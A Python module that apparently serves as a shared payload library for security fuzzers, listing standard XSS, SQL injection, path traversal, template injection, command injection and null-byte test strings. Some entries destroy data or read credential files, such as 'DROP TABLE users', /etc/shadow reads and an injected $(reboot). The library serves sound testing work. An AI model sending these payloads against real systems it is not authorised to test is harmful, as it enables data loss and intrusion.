# Purpose:
#   Centralized repository for categorized fuzz payloads used across API, web, and binary fuzzers.

# Usage:
#   from tools.payload_library import PAYLOADS
#   sql_payloads = PAYLOADS["sql_injection"]

PAYLOADS = {
    "xss": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>"
    ],
    "sql_injection": [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL,NULL--",
        "' AND SLEEP(5)--",
        "' OR ''='"
    ],
    "path_traversal": [
        "../../../../etc/passwd",
        "../" * 10 + "boot.ini",
        "..\\..\\..\\windows\\system.ini",
        "/../../../etc/shadow"
    ],
    "template_injection": [
        "{{7*7}}",
        "{{config.items()}}",
        "{% for c in [1,2,3] %}{{c}}{% endfor %}",
        "${7*7}"
    ],
    "command_injection": [
        "&& whoami",
        "| id",
        "`cat /etc/passwd`",
        "$(reboot)"
    ],
    "null_byte": [
        "\\x00",
        "%00",
        "A" * 1024 + "\x00"
    ],
    "misc": [
        "FUZZ",
        '" onmouseover="alert(1)',
        "A" * 5000
    ]
}
